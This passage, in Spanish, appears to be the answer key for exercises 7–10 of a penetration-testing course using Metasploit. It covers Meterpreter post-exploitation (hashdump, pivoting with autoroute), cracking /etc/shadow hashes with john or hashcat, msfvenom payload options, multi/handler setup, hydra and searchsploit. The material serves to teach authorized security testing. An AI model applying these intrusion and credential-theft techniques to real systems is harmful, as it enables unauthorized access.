- **A7.3** Meterpreter es un payload **en memoria y extensible** que ofrece una API rica — transferencia de archivos (`upload`/`download`), `sysinfo`, migración de procesos, `hashdump`, pivoting/`autoroute` y transporte cifrado — en lugar de una shell de comandos pelada. Es más sigiloso (corre en memoria, sin necesidad de un nuevo proceso) y muchísimo más capaz para la post-exploitation.
- **A7.4** `background` (o `Ctrl+Z`) pone en segundo plano la sesión actual; `sessions -l` (o simplemente `sessions`) lista todas las sesiones activas.

### Ejercicio 8
- **A8.1** **`SESSION`** lleva el ID de la sesión del host comprometido; un módulo post actúa *a través de una sesión existente*. `RHOSTS` nombra los objetivos de red a escanear/atacar desde cero — los módulos post no lo usan.
- **A8.2** El **pivoting** es usar un host comprometido como relay para alcanzar un segmento de red que no podés enrutar directamente. `run autoroute -s <subnet>` (meterpreter) agrega la ruta a través de la sesión.
- **A8.3** `/etc/shadow` contiene solo **hashes** de contraseñas, así que obtenerlo prueba el impacto (ahora podés intentar recuperar credenciales) pero no es acceso en sí mismo. A continuación lo crackeás **offline** con **john (John the Ripper)** o hashcat para recuperar las contraseñas en texto plano para reutilización/movimiento lateral.

### Ejercicio 9
- **A9.1** `msfvenom` consolidó **`msfpayload`** (generación de payloads) y **`msfencode`** (encoding). `-p` selecciona el **payload**, `-f` el **formato** de salida (elf/exe/raw/php/…), `-e` el **encoder**.
- **A9.2** `-b '\x00\x0a\x0d'` le dice a msfvenom que **produzca shellcode que evite esos bad bytes** (null, line-feed, carriage-return) que truncarían o corromperían el payload en el parser del objetivo (p. ej. un buffer de string-copy). El encoding es para **confiabilidad / evitación de bad-chars**, **no** un **bypass de AV/EDR** confiable — el decoder stub de `shikata_ga_nai` está él mismo firmado.
- **A9.3** El módulo **`exploit/multi/handler`** recibe el callback. Su **`PAYLOAD`**, **`LHOST`** y **`LPORT`** deben coincidir exactamente con los valores horneados en la salida de msfvenom, o la negociación de conexión/stage falla.

### Ejercicio 10
- **A10.1** Online: **hydra** (o medusa/patator) — ataca el servicio en vivo. Offline: **john** o **hashcat** — crackean hashes capturados. Offline se prefiere una vez que tenés los hashes porque es **rápido (sin ida y vuelta por la red), silencioso (sin logs de autenticación, sin bloqueos) e ilimitado en intentos**.
- **A10.2** **`searchsploit`** consulta la copia local de Exploit-DB. Si el resultado es un módulo de Metasploit, anotá su ruta y cargalo con `use <module>`; si es código de exploit autónomo, `searchsploit -m <id>` lo copia localmente para adaptarlo y ejecutarlo.
- **A10.3** Tres cualesquiera de: **activo afectado**, **severidad/puntuación CVSS**, **evidencia/PoC**, **impacto de negocio**, **probabilidad** y **remediación** — estos le permiten al cliente jerarquizar y arreglar los problemas en lugar de solo ver que eran explotables.

</details>